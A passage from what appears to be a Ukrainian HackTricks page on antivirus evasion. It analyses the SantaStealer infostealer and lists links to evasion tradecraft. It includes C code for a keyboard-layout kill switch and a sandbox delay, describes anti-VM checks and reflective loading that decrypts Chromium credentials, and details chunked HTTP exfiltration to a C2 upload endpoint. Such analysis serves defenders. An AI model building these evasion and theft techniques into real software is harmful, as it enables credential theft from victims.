SantaStealer (також відомий як BluelineStealer) демонструє, як сучасні викрадачі інформації поєднують обхід AV, протидію аналізу та доступ до облікових даних в одному робочому процесі.<sup>[[24]](#references)</sup>

### Перевірка розкладки клавіатури та затримка в sandbox

- Прапорець конфігурації (`anti_cis`) перелічує встановлені розкладки клавіатури за допомогою `GetKeyboardLayoutList`. Якщо знайдено кириличну розкладку, зразок створює порожній маркер `CIS` і завершує роботу до запуску stealer-ів, гарантуючи, що він не активується в виключених регіонах, і водночас залишаючи артефакт для пошуку.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Багаторівнева логіка `check_antivm`

- Варіант A проходить список процесів, хешує кожне ім’я за допомогою власної циклічної контрольної суми й порівнює результат із вбудованими списками блокування для debugger-ів/sandbox-ів; повторно обчислює контрольну суму для імені комп’ютера та перевіряє робочі каталоги, наприклад `C:\analysis`.
- Варіант B перевіряє властивості системи (мінімальну кількість процесів, час після останнього запуску), викликає `OpenServiceA("VBoxGuest")` для виявлення VirtualBox additions і виконує перевірки часу навколо пауз, щоб виявити покрокове виконання. За будь-якого збігу роботу перервано до запуску модулів.

### Безфайловий helper і подвійне завантаження через ChaCha20 у пам’ять

- Основна DLL/EXE містить Chromium credential helper, який або записується на диск, або вручну відображається в пам’яті; у безфайловому режимі він самостійно розв’язує імпорти та релокації, тож артефакти helper-а не записуються.
- Цей helper зберігає DLL другого етапу, двічі зашифровану ChaCha20 (два 32-байтові ключі та 12-байтові nonce). Після обох проходів він рефлексивно завантажує blob (без `LoadLibrary`) і викликає експорти `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, похідні від [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Процедури ChromElevator використовують рефлексивне hollowing процесів із direct syscall, щоб впровадитися в запущений браузер Chromium, успадкувати ключі AppBound Encryption і розшифрувати паролі/cookie/дані кредитних карток безпосередньо з баз даних SQLite попри посилений захист ABE.

### Модульний збір даних у пам’яті та HTTP-викрадення порціями

- `create_memory_based_log` перебирає глобальну таблицю вказівників на функції `memory_generators` і запускає по одному потоку для кожного ввімкненого модуля (Telegram, Discord, Steam, знімки екрана, документи, розширення браузера тощо). Кожен потік записує результати у спільні буфери й повідомляє кількість файлів після очікування завершення протягом приблизно 45 секунд.
- Після завершення все архівується за допомогою статично скомпонованої бібліотеки `miniz` у `%TEMP%\\Log.zip`. Потім `ThreadPayload1` чекає 15 секунд і передає архів частинами по 10 MB через HTTP POST на `http://<C2>:6767/upload`, підробляючи браузерну межу `multipart/form-data` (`----WebKitFormBoundary***`). До кожної частини додаються `User-Agent: upload`, `auth: <build_id>`, необов’язковий `w: <campaign_tag>`, а до останньої частини додається `complete: true`, щоб C2 знав, що повторне збирання завершено.

## References

- [1] [Передові методи ухилення: точкове підмінювання модулів](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – блог](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – стеки викликів: більше жодних поблажок для malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – документація](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – приклад](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – приклад](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC для підроблення стеку викликів](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – новий ланцюжок зараження та обфускація на основі ConfuserEx для DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – чи варто довіряти zero trust? Обхід перевірок стану пристрою Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – до ToolShell: дослідження попередніх ransomware-операцій Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: зловживання переадресованими експортами](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Перелік переадресованих експортів Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – порядок пошуку динамічно компонованих бібліотек](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – безпека процесів і права доступу](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – довідник EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Запускач CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – протидія EDR за допомогою Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – як пробити захисну оболонку Windows Defender за допомогою перенаправлення папок](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – довідник команди mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – під завісою Pure: від RAT до builder-а й розробника](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer вже близько: новий амбітний infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – розшифрування Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: протидія malware на Node.js за допомогою трасування API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Спляча красуня: приспати Adaptix за допомогою Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – отруєння параметрів процесу](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Спляча красуня II: CFG, CET і підроблення стеку](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Обфускація сну Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – приховування Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – зловживання Chrome Remote Desktop під час Red Team операцій: практичний посібник](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research – BTR Reforged: перетворення драйвера усунення загроз Defender на примітив для операцій у ядрі](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY – BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Супровідний код MDSec для Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec – Function Peekaboo: створення функцій із самоприховуванням за допомогою LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn – VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
{{#include ../banners/hacktricks-training.md}}
